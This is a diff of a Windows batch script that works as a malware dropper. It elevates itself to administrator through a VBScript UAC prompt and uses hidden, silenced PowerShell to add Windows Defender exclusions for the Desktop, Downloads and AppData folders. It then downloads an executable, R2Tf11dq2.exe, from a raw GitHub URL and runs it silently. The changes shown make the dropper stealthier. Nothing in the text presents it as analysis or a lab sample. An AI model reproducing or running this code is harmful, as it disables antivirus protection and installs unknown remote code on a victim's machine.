@@ -15,19 +15,31 @@ if '%errorlevel%' NEQ '0' (
 
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
-    exit /B
+    EXIT /B
 
 :gotAdmin
-    pushd "%CD%"
+    pushd "%TEMP%"
     CD /D "%~dp0"
 
 
-powershell  Set-MpPreference -ExclusionProcess "R2Tf11dq2.exe"
+REM --> Silent PowerShell commands
+    powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
+    powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
+    powershell -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1
+
+
 cd %TEMP%
 
+ 
 
-powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/R2Tf11dq2.exe' -OutFile R2Tf11dq2.exe" 
-Start R2Tf11dq2.exe
+
+@powershell -WindowStyle Hidden -Command "Invoke-WebRequest "https://raw.githubusercontent.com/walks111551/09672018256120856125/main/R2Tf11dq2.exe" -OutFile R2Tf11dq2.exe" >nul 2>&1
+
+    REM --> Execute R2Tf11dq2.exe silently
+    start /B "" R2Tf11dq2.exe >nul 2>&1
+    timeout /t 5 /nobreak >nul 2>&1
+
+
 
 EXIT /B
 
